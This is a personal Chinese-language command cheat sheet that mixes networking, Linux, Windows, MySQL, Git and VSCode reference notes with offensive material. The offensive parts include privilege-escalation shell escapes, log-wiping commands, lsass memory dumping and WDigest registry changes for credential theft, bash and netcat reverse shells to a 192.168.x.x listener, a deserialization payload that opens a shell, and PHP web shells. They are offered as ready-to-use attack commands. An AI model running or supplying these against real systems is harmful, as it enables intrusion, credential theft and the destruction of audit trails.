# Treasure

## Network

### 七层模型

|  OSI 模型  |             功能             | 相关                                                                                                                                                                         |
| :--------: | :--------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|   应用层   |      针对特定应用的协议      | HTTP--**超文本传输协议**<br/>FTP--**文件传输协议**<br/>SMTP--**简单邮件传输协议**<br/>Telnet--**远程登录协议**<br/>SNMP--**简单网络管理协议**<br/>DHCP--**动态主机配置协议** |
|   表示层   |  数据格式的转换,加密和压缩   |                                                                                                                                                                              |
|   会话层   | 建立,管理,终止进程之间的会话 |                                                                                                                                                                              |
|   传输层   |  管理两个节点之间的数据传输  | TCP--**传输控制协议**<br />UDP--**用户数据报协议**<br />TLS/SSL--**传输层安全性协议**                                                                                        |
|   网络层   |      地址管理与路由选择      | IP,ICMP,ARP...                                                                                                                                                               |
| 数据链路层 | 互连设备之间传送和识别数据帧 | PPP,以太网,Wi-Fi...                                                                                                                                                          |
|   物理层   |      传输数据的物理介质      | DTE--**数据终端设备**<br/>DCE--**数据通信设备或电路连接设备**                                                                                                                |

## Linux

### 基本命令

```
cd                      //切换目录 [-进入前一目录]
ls                      //显示当前目录下内容 [-l详细信息,-a所有文件]
tree                    //树形结构
pwd                     //查看当前所处目录
touch file              //创建空文件
mkdir file              //创建空目录 [-p建立多级目录]
rm                      //删除文件或目录 [-f强制删除-r递归处理]
cp a b                  //复制文件或目录 [-a保留链接、文件属性及目录下的所有内容]
scp a b                 //远程拷贝文件(a到:b) [-C使用压缩-P指定远程端口-r以递归方式复制]
mv a b                  //移动文件或目录(还可以重命名)
cat                     //查看文本文件内容
less                    //分页显示文本文件内容,前后翻看
diff a b                //比较两个文件的差异
whereis                 //在资料库中查找
find                    //按条件查询指定文件
locate                  //查找文件或目录
grep                    //筛选符合条件的内容 [-ABC前后-e或-i忽略大小写-n行号-o精确-v反向]
alias                   //设置指令的别名 [-p打印已设置]
uname                   //查看当前系统相关信息 [-a全部信息]
lsb_release             //查看当前系统的发行版信息 [-a全部信息]
tar                     //为文件或目录创建档案 [-c打包-x解包-v显示过程-f指定文件-z使用gzip处理]
su                      //切换用户
sudo                    //以系统管理者身份执行指令
chmod                   //变更文件或目录的权限
env                     //显示系统环境变量 [-u从当前环境中删除指定的变量]
echo                    //打印输出
curl                    //利用URL规则工作的文件传输工具 [-d·POST数据-H自定义头-k忽略警告-X请求方式]
wget                    //从指定的URL下载文件 [-r递归-l深度]
clear                   //清屏
ifconfig                //显示或设置网络设备
netstat                 //显示网络状态 [-pantu]
useradd name            //添加用户 [-r系统用户,-g指定用户组]
usermod name            //修改用户 [-u用户UID,-g所属分组]
userdel name            //删除用户 [-r删除相关文件]
ps                      //显示进程详情 [-a所有进程,-u以用户为主的进程,-x较完整信息]
kill PID                //结束执行程序
shutdown -h now         //立即关机
reboot                  //重启
管道命令 | 将前面的结果给后面的命令
重定向 > 是覆盖模式，>> 是追加模式
```

### 提权相关

```
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
find / -perm -u=s -type f 2>/dev/null
find / -nouser -o -nogroup
------------------------------------------------------
"/"命令可直接运行/bin/sh或/bin/bash
"cp"命令可将/bin/sh或/bin/bash复制到当前目录
ftp,gdb,vim,more/man/less中可运行!/bin/sh或!/bin/bash
awk 'BEGIN {system("/bin/sh或/bin/bash")}'
find . -exec /bin/sh或/bin/bash -p \;
rvim中执行:python import os; os.system("/bin/bash")
scp -S /path/yourscript x y:
+ echo 'os.execute("/bin/sh")' > getroot.nse
+ sudo nmap --script getroot.nse
-------------------------------------------------------
except spawn sh
python -c 'import os; os.system("/bin/sh")'
php -a 然后 exec("sh -i");
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
Lua:os.execute('/bin/sh').
-------------------------------------------------------
cd /tmp
# cp,vim,nano
+ echo "/bin/bash" > curl
+ chmod 777 curl
- ln -s /bin/sh curl
export PATH=/tmp:$PATH
echo "* * * * * root chmod 4777 /bin/sh" | sudo teehee -a /etc/crontab
-------------------------------------------------------
ssh user@IP - t "/bin/sh"或"/bin/bash"
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "() { :; }; /bin/bash"
pico -s "/bin/bash"进入编辑器写入/bin/bash然后按ctrl + T键
git -p help 然后 !/bin/sh或!/bin/bash
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
-------------------------------------------------------
export PATH=$PATH:/bin/     #将/bin导出到PATH环境变量
export PATH=$PATH:/usr/bin  #将/usr/bin目录导出到PATH环境变量
```

### 数据收集

```
/etc/passwd
/etc/shadow
/etc/crontab
/etc/nginx/sites-available/default
```

### 清理痕迹

```
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog
history -cw
```

## Window

### 基本命令

```
cd                                         //改变或显示当前目录 [/d]
dir                                        //显示当前目录下内容
ren                                        //文件或目录重命名
type                                       //查看文本文件内容
md                                         //创建目录
rd                                         //删除目录
copy                                       //复制文件
move                                       //移动文件
del                                        //删除文件 [/f强制删除]
cls                                        //清屏
chcp                                       //查看或修改窗口字符集 [65001-utf8,936-GBK中文简体]
whoami                                     //显示用户名
net user name *                            //修改用户密码
net user                                   //查看存在用户账号
net user name                              //查看当前用户信息
net user name password /add                //创建用户
net localgroup administrators name /add    //提升权限
net user name /delete                      //删除用户
systeminfo                                 //当前计算机的综合信息
tasklist                                   //显示当前运行的进程信息 [/svc显示进程主持的服务]
taskkill /pid num                          //结束进程 [/f强行终止/t由此启动的子进程]
ipconfig /flushdns                         //清除本地DNS缓存
```

### 数据收集

```
# 修改注册表开启/关闭Wdigest Auth
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
```
  
## Control

### Sundry

```
copy /a a.php + /b b.jpg = c.jpg
bash -c 'sh -i &>/dev/tcp/192.168.253.136/4444 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.136 4444 >/tmp/f
```

### Python

```
python -c 'import pty; pty.spawn("/bin/bash")'
__import__('os').system('nc -e /bin/bash 192.168.253.136 4444')
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["nc -e /bin/sh 192.168.56.102 5555"], 0, 0, 0]}
```

### PHP

```
<?php system($_GET['cmd']); ?>
<?php system("nc -e /bin/sh 192.168.253.136  4444"); ?>
```

## Other

### MySQL

```
create database <name>;                      //创建数据库
drop database <name>;                        //删除数据库
show databases;                              //显示数据库
use <name>;                                  //连接数据库
select database();                           //当前连接的数据库
-------------------------------------------------------------
show tables;                                 //显示数据表
desc <table>;                                //获取数据表结构
drop table <name>;                           //删除数据表
-------------------------------------------------------------
insert into <table> (key) values (..);       //表中插入数据
select * from <table>;                       //查看表中所有数据
select * from <table> where <if>;            //查看符合条件数据
delete from <table> where <if>;              //删除符合条件数据
update <table> set <val> where <if>;         //修改符合条件数据
-------------------------------------------------------------
union [all]                                  //联合查询
select * from <table> into outfile 'path';   //导出数据
mysqldump -u user -p data > file             //导出数据库
mysqldump -u user -p data table > file       //导出数据表
```

### Git

```
git config --global user.name "Your Name"
git config --global user.email "email@example.com"
-------------------------------------------------------------
1.生成RSA公钥和密钥 >>>>> ssh-keygen -t rsa -C "email@example.com"
2.将公钥id_rsa.pub上传到Github的SSHKeys中
3.将GitHub添加到授权主机列表 >>>>> ssh-keyscan -H github.com >> ~/.ssh/known_hosts
4.验证是否成功 >>>>> ssh -T git@github.com
-------------------------------------------------------------
git init                        //初始化本地仓库.git
git status -sb                  //显示当前所有文件的状态
git add path/.(all)             //用来将变动加到暂存区
git commit -m "info"            //用来正式提交变动,提交至.git仓库
git log/git log --oneline       //查看提交的版本信息
git reflog                      //查看全部的历史版本信息
git reset --hard 'number'       //通过版本号回退到某一个版本
git pull                        //从github上拉取最新的代码
git push -f origin master       //将代码推送到github的master分支上
-------------------------------------------------------------
git branch [name]               //查看所有分支/新建某个分支
git checkout name               //切换到某个分支
git merge name                  //将某个分支合并到当前分支下
-------------------------------------------------------------
+git remote add origin git@github.com:xxxxxxx/xxx.git
+git push -u origin master      //将仓库上传到GitHub
*git clone git@github.com:xxxx  //克隆仓库到本地
```

### VSCode

```
Chinese (Simplified) ...         //中文(简体)语言包
ESLint                           //语法检查
Code Runner                      //代码运行器
GitLens—Git supercharged         //增强Git功能
Visual Studio IntelliCode        //智能代码
Debugger for Chrome              //Chrome调试器
open in browser                  //在浏览器中打开
Live Server                      //启动服务器
Code Spell Checker               //代码拼写检查
Quokka.js                        //即时反馈
Prettier-Code formatter          //代码格式化
Path Intellisense                //路径感知
Easy LESS                        //less编译为css
jQuery Code Snippets             //jQuery代码片段
JavaScript (ES6) code snippets   //ES6代码片段
Vetur                            //Vue工具
Vue 2 Snippets                   //Vue2代码片段
Comment Translate                //划词翻译
Python                           //Python集成
```